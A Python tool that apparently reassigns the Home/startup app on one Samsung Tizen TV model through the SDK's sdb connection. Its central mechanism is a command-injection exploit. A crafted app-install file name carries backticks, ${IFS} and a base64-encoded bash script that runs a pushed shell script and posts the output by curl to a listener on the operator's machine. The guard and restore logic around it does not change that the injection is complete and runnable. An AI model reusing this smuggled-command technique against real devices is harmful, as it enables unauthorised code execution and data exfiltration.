from pathlib import Path
import sys, base64, ipaddress, json, os, socket, subprocess, time, uuid, urllib.request
r=Path(__file__).resolve().parents[2]; d=r/'.local/native-home'; d.mkdir(parents=True,exist_ok=True)
mode=sys.argv[1] if len(sys.argv)>1 else 'query'
if mode not in ['query','apply','restore','inspect']:raise SystemExit('Unknown action')
host=json.loads((r/'.local/device.json').read_text())['host'];ipaddress.ip_address(host)
with urllib.request.urlopen('http://'+host+':8001/api/v2/',timeout=4) as response: info=json.load(response)
if info.get('device',{}).get('modelName')!='QN55LS03DAFXZA':raise SystemExit('Model guard failed; nothing staged.')
sdb=str(r/'.local/tizen-sdk/tools/sdb');serial=host+':26101'
def run(args,timeout=12):
 p=subprocess.run([sdb,*args],capture_output=True,text=True,timeout=timeout)
 if p.returncode:raise RuntimeError('SDB transport failed: '+p.stdout[-300:]+p.stderr[-300:])
 return p
run(['connect',serial])
# Inspection is shell-only. Other modes re-stage reviewed helper files on each
# run so rollback survives SDK temporary-file cleanup.
if mode!='inspect':
 for suffix in ['dll','runtimeconfig.json','deps.json']:
    source=d/'out'/('CleanFrameHomeControl.'+suffix)
    run(['-s',serial,'push',str(source),'/home/owner/share/tmp/sdk_tools/CleanFrameHomeControl.'+suffix])
if mode in ['apply','restore']:
    run(['-s',serial,'push',str(d/'original.json'),'/home/owner/share/tmp/sdk_tools/CleanFrameHomeOriginal.json'])
token=uuid.uuid4().hex[:16];remote='/home/owner/share/tmp/sdk_tools/cfhi-'+token+'.sh'
run(['-s',serial,'push',str(r/'scripts/native-home'/(mode+'.sh')),remote])
with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as route:
 route.connect((host,9));callback=route.getsockname()[0]
port=8000
with socket.socket() as listener:
 listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);listener.bind(('0.0.0.0',port));listener.listen(1);listener.settimeout(45)
 command='cat '+remote+'|bash 2>&1|curl -s -m 40 --data-binary @- http://'+callback+':'+str(port)+'/'+token
 script='/bin/mkdir /tmp/s-'+token+' 2>/dev/null&&{ '+command+';}'
 encoded=base64.b64encode(script.encode()).decode()
 name='new2.tpk`printf${IFS}%s${IFS}'+encoded+'|base64${IFS}-d|bash`.tpk'
 argument='0 appinstall tpk '+name
 if len(argument.encode())>510:raise SystemExit('Command exceeds reviewed transport length; not executed.')
 proc=subprocess.Popen([sdb,'-s',serial,'shell',argument],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
 try:
  connection,peer=listener.accept()
  if peer[0]!=host:raise RuntimeError('Unexpected callback peer; no data accepted.')
  with connection:
   connection.settimeout(8);data=b''
   while b'\r\n\r\n' not in data:
    data+=connection.recv(4096)
    if len(data)>16384:raise RuntimeError('Unexpectedly large callback headers.')
   headers,body=data.split(b'\r\n\r\n',1);request_line=headers.splitlines()[0].decode(errors='replace')
   if request_line!='POST /'+token+' HTTP/1.1':raise RuntimeError('Unexpected callback request path.')
   lengths=[line.split(b':',1)[1].strip() for line in headers.splitlines()[1:] if line.lower().startswith(b'content-length:')]
   if len(lengths)!=1:raise RuntimeError('Callback did not contain one Content-Length header.')
   length=int(lengths[0]);
   if length>100000:raise RuntimeError('Unexpectedly large diagnostic output.')
   while len(body)<length:body+=connection.recv(min(65536,length-len(body)))
   connection.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK')
  output=body[:length].decode(errors='replace')
  try:stdout,stderr=proc.communicate(timeout=3)
  except subprocess.TimeoutExpired:proc.terminate();stdout,stderr=proc.communicate(timeout=3)
  (d/(mode+'-output.txt')).write_text(output)
  (d/(mode+'-transport.json')).write_text(json.dumps({'returncode':proc.returncode,'stdout':stdout,'stderr':stderr,'remote_probe':remote,'callback_address':callback,'callback_port':port,'time':time.time()},indent=2))
  if 'CLEANFRAME_HOME_INSPECT_BEGIN' not in output or 'CLEANFRAME_HOME_INSPECT_END' not in output:raise RuntimeError('Probe incomplete; device state is unknown. Inspect current values before retrying.')
  if mode=='query':
   lines=[line for line in output.splitlines() if line.startswith('CLEANFRAME_HOME_JSON=')]
   if len(lines)!=1:raise RuntimeError('Query did not return exactly one snapshot; baseline not saved.')
   snapshot=json.loads(lines[0].split('=',1)[1]); encoded_snapshot=(json.dumps(snapshot,separators=(',',':'))+'\n').encode()
   baseline=d/'original.json'
   if baseline.exists():
    if json.loads(baseline.read_text())!=snapshot:raise RuntimeError('Current state differs from the preserved recovery baseline; baseline was not overwritten.')
    print('Recovery baseline matches the current device state.')
   else:
    fd=os.open(baseline,os.O_WRONLY|os.O_CREAT|os.O_EXCL,0o600)
    with os.fdopen(fd,'wb') as baseline_file:baseline_file.write(encoded_snapshot)
    print('Recovery baseline saved with mode 0600; it will not be overwritten.')
   print('Read-only Home/startup query completed; private values are in ignored local diagnostics.')
  elif mode=='apply':
   lines=[line for line in output.splitlines() if line.startswith('CLEANFRAME_HOME_APPLIED=')]
   if len(lines)!=1:raise RuntimeError('Apply did not return exactly one verified snapshot.')
   snapshot=json.loads(lines[0].split('=',1)[1])
   if snapshot.get('Home')!='wCf2026App.CleanFrame' or snapshot.get('Strings',{}).get('db/appfw/home_appid')!='wCf2026App.CleanFrame' or snapshot.get('Autostart')!=1:raise RuntimeError('Apply readback did not match the requested Home configuration.')
   print('Native Home assignment applied and read back successfully; private values are in ignored local diagnostics.')
  elif mode=='restore':
   lines=[line for line in output.splitlines() if line.startswith('CLEANFRAME_HOME_RESTORED=')]
   if len(lines)!=1:raise RuntimeError('Restore did not return exactly one verified snapshot.')
   snapshot=json.loads(lines[0].split('=',1)[1]);original=json.loads((d/'original.json').read_text())
   if snapshot!=original:raise RuntimeError('Restore readback did not exactly match the preserved baseline.')
   print('Original Home/startup baseline restored and read back exactly; private values are in ignored local diagnostics.')
  else:print(output)
 finally:
  if proc.poll() is None:proc.terminate();proc.communicate(timeout=3)
